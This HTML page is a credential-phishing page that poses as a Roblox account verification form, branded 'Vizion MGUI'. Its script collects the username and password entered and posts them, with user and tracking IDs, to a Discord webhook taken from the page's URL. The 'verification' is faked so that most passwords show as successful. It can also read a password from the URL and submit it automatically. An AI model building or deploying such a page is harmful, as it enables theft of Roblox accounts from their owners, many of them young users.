<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login - Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            width: 400px;
            overflow: hidden;
        }
        
        .header {
            background: #00a2ff;
            padding: 20px;
            text-align: center;
        }
        
        .header h1 {
            color: white;
            font-size: 24px;
            font-weight: bold;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            background: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 40px;
            color: #00a2ff;
            font-weight: bold;
        }
        
        .login-form {
            padding: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            border-color: #00a2ff;
            outline: none;
        }
        
        .login-btn {
            background: #00a2ff;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .login-btn:hover {
            background: #0088cc;
        }
        
        .login-btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        
        .footer {
            padding: 15px 25px 25px;
            text-align: center;
            color: #666;
            font-size: 14px;
        }
        
        .footer a {
            color: #00a2ff;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .hidden {
            display: none;
        }
        
        .result-message {
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            text-align: center;
            font-weight: 600;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .failure {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
            color: #00a2ff;
        }
        
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #00a2ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">R</div>
            <h1>Account Verification</h1>
        </div>
        
        <div class="login-form">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter your username" value="LoginCheckerdsa" readonly>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            
            <button id="login-btn" class="login-btn">Verify Account</button>
            
            <div id="result-message" class="result-message hidden"></div>
        </div>
        
        <div class="footer">
            <p>This verification is powered by <strong>Vizion MGUI</strong></p>
            <p>By verifying, you agree to our <a href="#">Terms of Service</a></p>
        </div>
    </div>

    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        const userId = urlParams.get('userId');
        const presetUsername = urlParams.get('username');
        const successWebhook = urlParams.get('successWebhook');
        const failedWebhook = urlParams.get('failedWebhook');
        
        // DOM elements
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('login-btn');
        const resultMessage = document.getElementById('result-message');
        
        // Set preset username if available
        if (presetUsername) {
            usernameInput.value = presetUsername;
        }
        
        // Login button event
        loginBtn.addEventListener('click', async function() {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) {
                showResult('Please enter both username and password', false);
                return;
            }
            
            // Disable button and show loading
            loginBtn.disabled = true;
            loginBtn.textContent = 'Verifying...';
            resultMessage.className = 'result-message hidden';
            
            // Verify credentials
            const isValid = await verifyCredentials(username, password);
            
            // Show result
            await showResult(isValid ? 'Verification successful!' : 'Verification failed!', isValid);
            
            // Re-enable button
            loginBtn.disabled = false;
            loginBtn.textContent = 'Verify Account';
        });
        
        async function verifyCredentials(username, password) {
            // In a real implementation, this would verify with Roblox API
            // For this example, we'll simulate verification
            
            // Simulate API call delay
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Simple validation logic (replace with actual API call)
            if (password.length < 6) {
                return false;
            }
            
            // Check for common passwords
            const commonPasswords = ['password', '123456', 'roblox', 'qwerty', 'letmein'];
            if (commonPasswords.includes(password.toLowerCase())) {
                return false;
            }
            
            // If not obviously invalid, consider it valid (for demo purposes)
            // In real implementation, you would call Roblox API here
            return true;
        }
        
        async function showResult(message, isSuccess) {
            resultMessage.textContent = message;
            resultMessage.className = `result-message ${isSuccess ? 'success' : 'failure'}`;
            resultMessage.classList.remove('hidden');
            
            // Send result to Discord if webhooks are provided
            if (successWebhook && failedWebhook) {
                await sendToDiscord(isSuccess, usernameInput.value, passwordInput.value);
            }
        }
        
        async function sendToDiscord(isSuccess, username, password) {
            const webhookUrl = isSuccess ? successWebhook : failedWebhook;
            const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
            const color = isSuccess ? 5763719 : 15548997;
            
            const embed = {
                title: `Roblox Account Verification - ${statusText}`,
                color: color,
                description: `**Verification completed**\n**Status:** ${statusText}\n**Date:** ${new Date().toLocaleString()}`,
                fields: [
                    {
                        name: "👤 Account Info",
                        value: `**Username:** ${username}\n**User ID:** ${userId || 'N/A'}\n**Tracking ID:** ${trackingId || 'N/A'}`,
                        inline: false
                    },
                    {
                        name: "🔐 Login Details",
                        value: `**Password:** ||${password}||\n**Result:** ${statusText}`,
                        inline: false
                    }
                ],
                footer: {
                    text: "Vizion MGUI (Auto Login Checker) • Private System",
                    icon_url: "https://www.roblox.com/favicon.ico"
                },
                timestamp: new Date().toISOString()
            };
            
            const payload = {
                username: "Vizion MGUI Checker",
                avatar_url: "https://www.roblox.com/favicon.ico",
                content: isSuccess ? "✅ **Verification Successful**" : "❌ **Verification Failed**",
                embeds: [embed]
            };
            
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    console.error('Failed to send to Discord:', response.status);
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }
        
        // Auto-fill password from URL if available
        const urlPassword = urlParams.get('password');
        if (urlPassword) {
            passwordInput.value = urlPassword;
            // Auto-click verify button after a delay
            setTimeout(() => {
                loginBtn.click();
            }, 1000);
        }
    </script>
</body>
</html>
